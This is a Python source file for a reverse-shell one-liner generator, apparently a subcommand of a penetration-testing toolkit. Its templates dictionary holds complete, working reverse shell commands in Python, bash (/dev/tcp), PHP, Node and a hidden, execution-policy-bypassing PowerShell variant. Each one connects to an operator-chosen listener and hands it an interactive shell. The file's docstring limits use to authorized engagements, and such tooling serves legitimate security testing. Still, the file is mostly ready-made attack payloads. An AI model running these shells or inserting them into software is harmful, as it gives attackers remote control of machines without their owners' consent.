"""REVERSE SHELL ONE-LINER GENERATOR.

    arsenal revshell --lhost 10.0.0.5 --lport 4444 [--lang python|bash|php|node|powershell]
    arsenal revshell --list

Prints standard, well-known reverse shell one-liners for the requested
language with the given listener host/port baked in.

Authorized engagements only: reverse shells are for targets you have
written permission to test.
"""

from __future__ import annotations

from rich.console import Console

console = Console()

_TEMPLATES = {
    "python": (
        "python3 -c 'import socket,subprocess,os;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        's.connect(("{lhost}",{lport}));'
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        'subprocess.call(["/bin/sh","-i"])\''
    ),
    "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "php": (
        "php -r '$sock=fsockopen(\"{lhost}\",{lport});"
        "$proc=proc_open(\"/bin/sh -i\", "
        "array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"
    ),
    "node": (
        "node -e 'var s=require(\"net\").Socket();"
        's.connect({lport},"{lhost}",function()'
        '{{require("child_process").spawn("/bin/sh",["-i"],{{stdio:[s,s,s]}})}};\''
    ),
    "powershell": (
        "powershell -NoP -NonI -W Hidden -Exec Bypass -c "
        "\"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
        "{{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$sb=(iex $d 2>&1|Out-String);$r=$sb+'PS '+(pwd).Path+'> ';"
        "$sb2=([text.encoding]::ASCII).GetBytes($r);"
        "$s.Write($sb2,0,$sb2.Length);$s.Flush()}};$c.Close()\""
    ),
}

_LANGUAGES = list(_TEMPLATES.keys())


def render(lang: str, lhost: str, lport: int) -> str:
    """Render the one-liner for lang with lhost/lport filled in."""
    if lang not in _TEMPLATES:
        raise ValueError(f"unknown language '{lang}' (choose from: {', '.join(_LANGUAGES)})")
    return _TEMPLATES[lang].format(lhost=lhost, lport=lport)


def cmd_revshell(args, ctx) -> int:
    if args.list:
        console.print("[bold]Supported reverse shell languages[/]:")
        for lang in _LANGUAGES:
            console.print(f"  [cyan]{lang}[/]")
        return 0
    if not args.lhost or args.lport is None:
        console.print("[red]--lhost and --lport are required (or use --list).[/]")
        return 1
    lang = args.lang or "python"
    if lang not in _TEMPLATES:
        console.print(f"[red]Unknown language '{lang}'. Use --list to see options.[/]")
        return 1
    shell = render(lang, args.lhost, args.lport)
    console.print(f"[bold]Reverse shell[/] ([cyan]{lang}[/]) -> {args.lhost}:{args.lport}")
    print(shell)
    return 0


def add_parsers(sub):
    p = sub.add_parser(
        "revshell",
        help="Generate reverse shell one-liners",
        description="Print standard reverse shell one-liners for the given listener.",
        epilog=(
            "Authorized engagements only: reverse shells are for targets "
            "you have written permission to test."
        ),
    )
    p.add_argument("--lhost", metavar="IP", help="Listener host (your IP)")
    p.add_argument("--lport", type=int, metavar="PORT", help="Listener port")
    p.add_argument("--lang", default="python", choices=_LANGUAGES,
                   help="Shell language (default: python)")
    p.add_argument("--list", action="store_true",
                   help="List supported languages and exit")
    p.set_defaults(func=cmd_revshell)
    return p


def dispatch(args, ctx):
    func = getattr(args, "func", None)
    if callable(func):
        return func(args, ctx)
    raise ValueError("no command dispatch configured for revshell")
